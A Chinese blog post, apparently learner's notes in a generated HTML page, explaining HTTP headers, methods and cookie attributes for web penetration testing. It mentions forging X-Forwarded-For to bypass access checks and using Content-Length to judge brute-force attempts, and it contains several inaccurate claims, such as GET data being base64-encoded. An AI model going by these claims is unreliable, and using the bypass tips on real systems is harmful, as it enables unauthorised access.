@@ -1,0 +1,630 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="HTTP请求       在抓包时，通常有HTTP&#x2F;1.1或者1.0，1.1或者1.0是因特网上网的HTTP版本，许多浏览器默认使用的都是1.1版本，1.0的比较老了。这两个版本规范之间存在一定的差异，然而，当攻击web应用程序时，web渗透测试工程师可能遇到的唯一差异是1.1的版本必须使用Host请求头。 Host：就是域名，访问网站的IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web应用程序">
+<meta property="og:url" content="https://sculptor-liu.github.io/2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/index.html">
+<meta property="og:site_name" content="Sculptor&#39;s blog">
+<meta property="og:description" content="HTTP请求       在抓包时，通常有HTTP&#x2F;1.1或者1.0，1.1或者1.0是因特网上网的HTTP版本，许多浏览器默认使用的都是1.1版本，1.0的比较老了。这两个版本规范之间存在一定的差异，然而，当攻击web应用程序时，web渗透测试工程师可能遇到的唯一差异是1.1的版本必须使用Host请求头。 Host：就是域名，访问网站的IP地址。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-02T03:32:50.848Z">
+<meta property="article:modified_time" content="2020-09-23T12:30:14.761Z">
+<meta property="article:author" content="Sculptor">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary"><title>Web应用程序 | Sculptor's blog</title><link ref="canonical" href="https://sculptor-liu.github.io/2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-info-circle"></i></span><span class="header-nav-menu-item__text">关于我</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Sculptor's blog</div><div class="header-banner-info__subtitle">不知名的陌生人</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Web应用程序</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-07-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-09-23</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="HTTP请求"   >
+          <a href="#HTTP请求" class="heading-link"><i class="fas fa-link"></i></a>HTTP请求</h1>
+      <p>在抓包时，通常有HTTP/1.1或者1.0，1.1或者1.0是因特网上网的HTTP版本，许多浏览器默认使用的都是1.1版本，1.0的比较老了。这两个版本规范之间存在一定的差异，然而，当攻击web应用程序时，web渗透测试工程师可能遇到的唯一差异是1.1的版本必须使用Host请求头。</p>
+<p>Host：就是域名，访问网站的IP地址。</p>
+<a id="more"></a>
+<p>Accept-Encoding：浏览器支持的压缩编码是gzip和deflate。（当前的请求的http页面是经过压缩的，用于增加用户体验，访问更快了，但是会给服务器带来一定的压力，因为它要做压缩距离）</p>
+<p>Accept-Language：浏览器支持的语言类型是中文和简体中文，优先支持简体中文。zh-cn表示简体中文，zh表示中文；q是权重系数，在0-1之间，q值越大，请求越倾向于获得其“：”之前的类型表示的内容，若没有指定的q值，默认为1，若被赋值0，则用于提醒服务器哪些是浏览器不支持的内容类型。</p>
+<p>Cookie：消息头用于提交服务器向客户端发布的其他参数</p>
+<p>Connection：clsoe/keep-live, 与网站的连接状态；close的服务器配置比较好，在访问人数过多的时候，如果一直是keep的状态，会消耗很多的服务器资源，因为TCP的连接数是有限的。</p>
+<p>Cache-Control：这个消息头用于向服务器发送缓存的指令（如：no-cache，没有缓存)</p>
+<p>Upgrade-insecure-Requests：该指令用于让浏览器自动升级请求从http升到https，用于大量包含http资源的http网页直接升级到https不会报错，间洁地来说，就是在http和https之间起着过渡作用。（只用https才有这个字段，强行切换成https，有加密的，解决安全问题）</p>
+<p>User-Agent：代表自己的浏览器版本和自己本机的操作系统版本。注意：由于历史原因，大多数浏览器中都包含Mozilla这个前缀，这是因为最初占支配地位的Netscape浏览器使用了User-Agent字符串，而其他浏览器也希望让web站点相信它们与这种标准兼容。</p>
+<p>Accept：浏览器支持的MIME类型分别是text/html，application/xhtml+xml，application/xml，x/x,，优先顺序按从左到右的顺序（表示当前浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体资源类型时，会返回 406 Not Acceptable 响应，当然，使用了x/x代表接受任意类型的资源，所以不会看到这个响应。另外，这里的q代表权重，在0-1之间，可以理解成客户端在这些给定的类型中，想优先接受什么类型，服务器可以根据客户端要求返回响应的资源。（如果没有，则默认为1。这里前面几个类型都没有标注，则默认为1，表示优先这些类型。后面0.9表示前面都没有就用这个，最后 的0.8表示，都没有的话任意类型都可以）</p>
+<p> <strong>详解：</strong></p>
+<p>​        text/html，application/xhtml+xml，application/xml可以理解为媒体类型和内容类型，/前面时 type（类型），/ 后面是        subtype（子类型）：type指定大的范围，subtype是type中范围更加明确的类型，即大类中的小类。</p>
+<p>​        Text：用于标准化地表示文本信息，文本消息可以是多种字符集和或者多种格式的</p>
+<p>​        text/html：表示html文档</p>
+<p>​        Application：用于传输应用程序数据或者二进制数据。</p>
+<p>​        application/xhtml+xml：表示xhtml文档</p>
+<p>​        application/xml：表示xml文档</p>
+<p>Referer：当前页面是由什么网页跳转而来的，可以用于防盗链，意思就是加了这个，当当前页面不是从它应该从的跳转页面而来的视为非法。</p>
+<p>ETag：这个消息头用于指定一个实体标签，客户端可在将来的请求中提交这个标识符，获得和If-None-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是哪个版本的资源。</p>
+<p>Enprires：这个消息头用于向浏览器说明消息主体内容的有效时间，在这个有效时间之前，浏览器可以使用这个资源的缓存副本。</p>
+<p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p>
+<p>Pragma：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p>
+<p>X_FORWARDED_FOR：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求字段。（可以进行伪造绕过当前的网页，进入下一个网页，例如：X_FORWARDED_FOR：10.0.0.1，就可以直接访问10.0.0.1）</p>
+<p>Authorization：这个消息头用于为一种内置HTTP身份验证向服务器提交证书。</p>
+<p>If-Modified-Since：这个消息头用于说明浏览器最后一次收到所请求的资源的时间。如果自那以后资源没有发生变化，服务器就会发出一个带状态码304的响应，指示客户端使用资源的缓存副本。</p>
+<p>If-None -Match：这个消息头用于指定- 一个实体标签。实体标签是-一个说明消息主体内容的标识符。当最后一次收到所请求的资源时.浏览器提交服务器发布的实体标签。服务器可以使用实体标签确定浏览器是否使用资源的缓存副本。</p>
+<p>0rigin：这个消息头用在跨域Ajax t求中，用于指示提出请求的域。</p>
+
+        <h1 id="HTTP响应"   >
+          <a href="#HTTP响应" class="heading-link"><i class="fas fa-link"></i></a>HTTP响应</h1>
+      <p>HTTP/1.1 200 OK：证明当前网页正常访问</p>
+<p>Server：消息头中包含一个旗标，指明所使用的Web服务器软件，有时还包括其他信息，如：所安装的模块和服务器操作系统，但其中所包含的信息可能不准确。（服务器类型，什么nginx之类的）</p>
+<p>Set-Cookie：消息头向浏览器发送另一个cookie，它将随后向服务器发送的请求中由Cookie消息头返回。</p>
+<p>Pragma ：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p>
+<p>几乎所有的HTTP响应在消息头后的空白行下面都包含消息主体，Content-Type 消息头示这个消息主体中包含一个HtML文档。</p>
+<p>Content-Length：消息头规定消息主体的字节长度。</p>
+<p>ETag：w/”59a3dc83-f61”浏览器根据HTTP请求的ETag验证请求的资源是否发生了改变，如果它未发生变化，服务器将返回“304 Not Modified” 响应，并且资源从浏览器缓存中读取，这样就不必再次下载请求。（也是与缓存有关的，就是我缓存过这个文件，下次我再访问时服务器就不会再次下载这个文件了，这个缓存是已经下载到我们的本地了）</p>
+<p>Vary：Accept-Encoding”标头：说明对方网站一般启用了GZip压缩</p>
+<p>Expires：RFC 2616 (HTTP/1. 0)协议中和网页缓存相关字段。用来控制缓存的失效日期。</p>
+<p>Content-Length：代表请求的数据包，就是html文件的长度大小，渗透测试或者是暴力破解就是根据这个来判断，正确的密码和错误的密码是不一样的。</p>
+<p>X-Powered-By：网站使用的框架（如：thinkphp)</p>
+<p>X-Frame-Options：这个消息头指示浏览器框架是否及如何加载当前响应。</p>
+<p>Last-Modified：说明对于访问的文件，服务器的运维人员最后一次修改的日期。</p>
+<p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p>
+<p>Access-Control-Allow-Origin：这个消息头用于指示可否通过跨域Ajax请求获取资源。</p>
+<p>WWW-Authenticate：这个消息头用在带401状态码的响应中，提供与服务器所支持的身份验证类型有关的信息。（系统支持的身份认证，windows和Linux支持的）</p>
+
+        <h1 id="HTTP方法"   >
+          <a href="#HTTP方法" class="heading-link"><i class="fas fa-link"></i></a>HTTP方法</h1>
+      <p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</p>
+<p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p>
+<p>当渗透测试员攻击Web应用程序时,几乎肯定会遇到最常用的方法:GET和POST.这些方法之间存在-些必须了解的重要差异，忽略这些差异可能会危及应用程序的安全。</p>
+
+        <h2 id="1-GET"   >
+          <a href="#1-GET" class="heading-link"><i class="fas fa-link"></i></a>1.GET</h2>
+      <p>GET方法的作用在于获取资源。它可以用于URL查询字符串的形式向所请求的资谏发送参数。这使用户可将一个包含动态资源的UrL标注为书签，用户自己或其他用户随后可重复利用该书签来获取等价的资源(作用与标注为书签的搜索查询相似)。URL显示在屏幕上.并被记录在许多地方，如浏览器的历史记录和Web服务器的访问旧志中。如果单击外部链接，还可以用Referer消息头将它们传送到其他站点。因此，请勿使用查询字符申传送任何敏感信息。</p>
+
+        <h2 id="2-POST"   >
+          <a href="#2-POST" class="heading-link"><i class="fas fa-link"></i></a>2.POST</h2>
+      <p>POST方法期初是用来向服务器输入数据的，实际上，通常会用它来支持HTML的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方。</p>
+
+        <h2 id="3-HEAD"   >
+          <a href="#3-HEAD" class="heading-link"><i class="fas fa-link"></i></a>3.HEAD</h2>
+      <p>HEAD方法和GET方法的行为很类似，但是服务器在响应中只返回首部，不会返回实体的主体部分。这就允许客户端在未获取实际资源的情况下，对资源的首部进行检查。（优点：在不获取资源的情况下了解资源的情况（比如：判断其类型）；通过查看响应的状态码，看看某个对象是否存在；通过查看首部，测试资源是否被修改了）。</p>
+
+        <h2 id="4-PUT"   >
+          <a href="#4-PUT" class="heading-link"><i class="fas fa-link"></i></a>4.PUT</h2>
+      <p>PUT与GET从服务器读取文档想法，PUT方法会向服务器写入文档。PUT方法的语义就是让服务器用请求的主体部分来创建一个由所请求的URL命名的新闻的，或者替换已存在的URL。</p>
+
+        <h2 id="5-TRACE"   >
+          <a href="#5-TRACE" class="heading-link"><i class="fas fa-link"></i></a>5.TRACE</h2>
+      <p>客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或者其他一些应用程序。每个中间节点都可能会修改原始的HTTP请求。TRACE方法允许客户端在最终将请求发送给服务器时，看看它变成什么样子了。        TRACE请求会在目的服务器端发起一个“环回”诊断。行程最后一站的服务器会弹回一条TRACE响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间HTTP应用程序组成的请求/响应链上，原始报文是否被毁坏，以及如何被毁坏或修改过。</p>
+<p>TRACE方法主要用于诊断，用于验证请求是否如愿穿过了请求/响应链。可以用来查看代理和其他应用程序对用户请求所产生的效果。        TRACE的缺点是：它假定中间应用程序对各种不同类型请求的处理是相同的。很多HTTP应用程序会根据方法的不同做出不同的事情，例如代理会把POST请求直接发给服务器，而GET请求发送给另一个HTTP应用改程序（比如缓存）。TRACE不提供区分这些方法的机制，通常中间应用程序会自行决定对TRACE请求的处理方式。        TRACE请求中不能带有实体的主体部分。TRACE响应的实体主体部分包含了响应服务器收到的请求的精确副本。</p>
+
+        <h2 id="6-OPTIONS"   >
+          <a href="#6-OPTIONS" class="heading-link"><i class="fas fa-link"></i></a>6.OPTIONS</h2>
+      <p>OPTIONS方法请求Web服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支撑哪些方法。（有些服务器可能只支持对一些特殊类型的对象使用特定的操作）        这为客户端应用程序提供了一种手段，使其不用实际访问那些资源就能判定访问各种资源的最优方式</p>
+
+        <h2 id="7-DELETE"   >
+          <a href="#7-DELETE" class="heading-link"><i class="fas fa-link"></i></a>7.DELETE</h2>
+      <p> DELETE方法所做的事情就是请服务器删除请求URL所指定的资源。但客户端应用程序无法保证删除操作一定会被执行。因为HTTP规范允许服务器在不通知客户端的情况下撤销请求。</p>
+
+        <h2 id="8-CONNECT"   >
+          <a href="#8-CONNECT" class="heading-link"><i class="fas fa-link"></i></a>8.CONNECT</h2>
+      <p>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</p>
+
+        <h2 id="9-PATCH"   >
+          <a href="#9-PATCH" class="heading-link"><i class="fas fa-link"></i></a>9.PATCH</h2>
+      <p>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</p>
+
+        <h2 id="10-GET和POST的区别"   >
+          <a href="#10-GET和POST的区别" class="heading-link"><i class="fas fa-link"></i></a>10.GET和POST的区别</h2>
+      <p>1、GET请求的数据是放在HTTP包头中的，也就是URL之后，通常是像下面这样定义格式的：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%E5%A5%BD其中，以?来分隔URL和数据；以&amp;来分隔参数；如果数据是英文或数字，原样发送；如果数据是中文或其它字符，则进行BASE64编码。而Post是把提交的数据放在HTTP正文中的。       </p>
+<p> 2、GET提交的数据比较少，最多1024B，因为GET数据是附在URL之后的，而URL则会受到不同环境的限制的，比如说IE对其限制为2K+35，而POST可以传送更多的数据（理论上是没有限制的，但一般也会受不同的环境，如浏览器、操作系统、服务器处理能力等限制，IIS4可支持80KB，IIS5可支持100KB）。        </p>
+<p>3、Post的安全性要比Get高，因为Get时，参数数据是明文传输的，参数直接暴露在url中，所以不能用来传递敏感信息。而且使用GET的话，还可能造成Cross-site request forgery攻击。而POST数据则可以加密的，但GET的速度可能会快些。        4、get请求只能进行url编码，而post支持多种编码方式；get请求会浏览器主动cache，而post支持多种编码方式；get请求参数会被完整保留在浏览历史记录里，而post中的参数不会被保留。        </p>
+<p>5、GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。        </p>
+<p>6、GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p>
+
+        <h2 id="11-扩展方法"   >
+          <a href="#11-扩展方法" class="heading-link"><i class="fas fa-link"></i></a>11.扩展方法</h2>
+      <p>http被设计成可扩展的，这样新特性就不会使老的版本失效。扩展方法指的是没在HTTP/1.1中规范定义的，服务器为它管理的资源实现一些HTTP服务，为开发者提供了一种扩展这些HTTP服务能力的手段        </p>
+<p>下表列出了一些常用的扩展方法：        </p>
+<p>LOCK:允许用户“锁定资源”编辑某个资源时将其锁定，以防别人同时对其修改        </p>
+<p>MKCOL:允许用户创建资源        </p>
+<p>COPY:便于在服务器上复制资源        </p>
+<p>MOVE:在服务器上移动资源        </p>
+<p>上面例子中的方法便于用过http将web内容发布到web服务器上。        </p>
+<p>不是所有的扩展都是在正式规范中定义的，因此，扩展方法秉持“对发送内容要求严格，对所接受的内容宽容点”来处理一般的HTTP扩展方法很重要。</p>
+
+        <h1 id="Cookie"   >
+          <a href="#Cookie" class="heading-link"><i class="fas fa-link"></i></a>Cookie</h1>
+      
+        <h2 id="1-cookie是什么"   >
+          <a href="#1-cookie是什么" class="heading-link"><i class="fas fa-link"></i></a>1.cookie是什么</h2>
+      <p>由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢?那就给每次新的用户请求时，给它颁发一个身份证(独一无二)吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。</p>
+<p>其实cookie是一个很小的文本文件,是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie,这些cookie可以用来辨别用户身份信息等作用。</p>
+<p><strong>例如</strong>：</p>
+<p>HTTP/1 0200 OK</p>
+<p>Set-Cookie：id= 23451 * domain “ zhuanzhuan 58 com *Conent-type text/html</p>
+<p>Content-length: 1287</p>
+<p>用户首次访问服务器，服务器会返回一个独-无二的识别码，id=23451，这样服务器可以用这个码跟踪记录用户的信息，(购物历史， 地址信息等) 。</p>
+<p>cookie可以包含任意的信息，不仅仅是id,客户端会记录服务器返回来的Set Cookie首部中的cookie内容。并将cookie 存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XxX的身份证(cookie) ，并在Cookie请求首部发送过去。   </p>
+
+        <h2 id="2-cookie利用"   >
+          <a href="#2-cookie利用" class="heading-link"><i class="fas fa-link"></i></a>2.cookie利用</h2>
+      <p>cookie是大多数Web应用程序所依赖的HTTP协议的一一个关键组成部分，攻击者常常通过它来。利用Web应用程序中的漏洞。服务器使用cookie 机制向客户端发送数据，客户端保存cookie 并将其返回给服务器。与其他类型的请求参数(存在于URL 查询字符串或消息主体中)不同，无须应用程序或用户采取任何特殊措施.随后的每一个请求 都会继续重新向服务器提交cookie。</p>
+<p>如前所述，服务器使用Set-Cookie响应消息头发布cookie；</p>
+<p>Set-Cookie: tracking=tI8rk7 jllx44S2u85nSWcw（一般的也是持久cookie，设定一定的到期日期，不会随着浏览器的关闭导致cookie的被删除）</p>
+<p>然后，用户的浏览器自动将下面的消息头进行添加，随后返回给同一服务器的请求中；</p>
+<p>Cookie: tracking=tl8rk7jolx44S2Uu85nSWcu</p>
+<p>如上所示. cookie -般由一个名/值对构成，但也可包含任何不含空格的字符串。可以在服务，器响应中使用几个Set-Cookie消息头发布多个cookie.并可在同一个Cookie消息头中用分号分隔不同的cookie,将它们全部近回给服务器。</p>
+<p>除cookie的实际位外，Set-Cookie 消息头还可包含以下任何可选属性，用它们控制浏览器处理cookie的方式。</p>
+<p>expires：用于设定cookie的有效时间。这样会使浏览器将cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么cookie 仅用在当前浏览器会话中。（cookie过期的日期）</p>
+<p>domain：用于指定cookie的有效域。这个域必须和收到cookie的域相同，或者是它的父域。</p>
+<p>path：用于指定cookie的有效URL路径。</p>
+<p>secure：如果设置这个属性，则仅在HTTPS请求中提交cookie。</p>
+<p>HttpOnly.：如果设置这个属性， 将无法通过客户端JavaScript直接访问cookie. 。</p>
+<p>上述每一个cookie属性都可能影响应用程序的安全其造成的主要不利影响在于攻击者能够，直接对应用程序的其他用户发动攻击。</p>
+
+        <h2 id="3-cookie的类型"   >
+          <a href="#3-cookie的类型" class="heading-link"><i class="fas fa-link"></i></a>3.cookie的类型</h2>
+      <p>可以按照过期时间分为两类：会话cookie和持久cookie.</p>
+<p>会话cookie是一-种临时 cookie,用户退出浏览器，会话Cooke就会被删除了；持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性 访问服务器的配置文件或者置录信息。</p>
+
+        <h2 id="4-cookie的属性"   >
+          <a href="#4-cookie的属性" class="heading-link"><i class="fas fa-link"></i></a>4.cookie的属性</h2>
+      
+        <h3 id="cookie域"   >
+          <a href="#cookie域" class="heading-link"><i class="fas fa-link"></i></a>cookie域</h3>
+      <p>产生Cookie的服务器可以向set- Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie</p>
+<p>例如：Set-Cookie：name=”wang”; domain=”m. zhuanzhuan. 58. com”</p>
+<p>如果用户访问的是m.zhuanzhuan.58.com，那就会发送cookie：name=”wang”；如果是访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.aaa.com(而不是这个m.zhuanzhuan.58.com),就不会发送这个cookie./" >www.aaa.com（而不是这个m.zhuanzhuan.58.com)，就不会发送这个cookie。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="cookie的路径path"   >
+          <a href="#cookie的路径path" class="heading-link"><i class="fas fa-link"></i></a>cookie的路径path</h3>
+      <p>Path属性可以为服务器特定文档指定Cooke,这个属性设置的url且带有这个前缀的url路径都是有效的。</p>
+<p>例如：m.zhuanzhuan.58.com和m.zhuanzhuan.58.com/user/这连个url，</p>
+<ol>
+<li><p>m.zhuanzhuan.58.com设置cookie：</p>
+<p>Set-cookie：id=”123432” ; domain=”m. zhuanzhuan. 58. com”</p>
+</li>
+<li><p>m.zhuanzhuan.58.com/user/设置cookie</p>
+<p>Set-cookie：user=”wang” , domain=”m. zhuanzhuan. 58. com”;path=/user/</p>
+</li>
+<li><p>other</p>
+<p>但是访问其他路径：m.zhuanzhuan.58.com/other/就会获得：cookie：id=”123432”</p>
+<p>如果访问m.zhuanzhuan.58.com/user/就会获得：cookie：id=”123432”;cookie：user=”wang”</p>
+</li>
+</ol>
+
+        <h3 id="secure"   >
+          <a href="#secure" class="heading-link"><i class="fas fa-link"></i></a>secure</h3>
+      <p>设置了属性secure, cookie只有在https协议加密情况下才会发送给服务端，但是这并不是最安全的，由于其固有的不安全性，教感信息也是不应该通过cookie传输的.</p>
+<p>Set-Cookie：id-a3fWa；Expires=Wed，21 Oct  2015  07:28:00 GMT，Secure；chrome 52和firefox 52开始不安全的(HTTP)是无法快用secure的。</p>
+
+        <h1 id="操作Cookie"   >
+          <a href="#操作Cookie" class="heading-link"><i class="fas fa-link"></i></a>操作Cookie</h1>
+      <p>通过docuemnt.cookie可以设置和获取Cookie的值</p>
+<p>document.cookie =”user=wang” ;</p>
+<p>console. log (document. cookie);<br>禁止javascnipt操作cookie (为避免跨域脚本(xss)攻击，通过javascipt的document.cookie无法访问常有Httponly标记的cookie)<br>Set-Cookie：id-a3fWa; Expires=Wed, 21 0ct 2017 07:28:00 GMT; Secure；HttpOnly</p>
+
+        <h1 id="第三方cookie"   >
+          <a href="#第三方cookie" class="heading-link"><i class="fas fa-link"></i></a>第三方cookie</h1>
+      <p>通常cookie的域和浏览器地址的域匹配，这被称为第一方 cookie.那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。</p>
+<p>例如：</p>
+<ol>
+<li><p>用户访问服务器1的一个页面index.html,这个页面和第三方广告网站合作，这个页面还有一张<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候,www.advertisement.com这个服务器会给用户设置cookie/" >www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:</p>
+<p>Set-Cookie: user= “wang”；like=”a”；domin=”advertisement.com”</p>
+<p>记录用户的浏览记录，分配个user来表示用户的身份。</p>
+</li>
+<li><p>用户访问服务器2的一个index.html页面，这个页面也和同家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/" >www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>Cookie：user=” wang”; like=”a”;</p>
+<p> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.advertisement.com收到浏览器发送的cookie识别了用户的身份,同时又把这个页面用户的浏览数据设置cookie/" >www.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>Set -Cookie: buy= “b” ; domain= ”adverti sement.com”</p>
+</li>
+<li><p>很巧，用户访问服务器3的一个index.html页面，这个页面也和那家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/" >www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>Cookie: user=”wang”; like=”a”; buy=”b”</p>
+<p>这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。</p>
+</li>
+</ol>
+
+        <h1 id="安全"   >
+          <a href="#安全" class="heading-link"><i class="fas fa-link"></i></a>安全</h1>
+      <p>多数网站使用cookie作为用户会话的唯一标识， 因为其他的方法具有限制和漏洞。如果一 个网站使用cookies作为会<br>话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者<br>的，因为用户和攻击者拥有相同的身份验证，下面介绍几种cookie盗用和会话劫持的例子：</p>
+
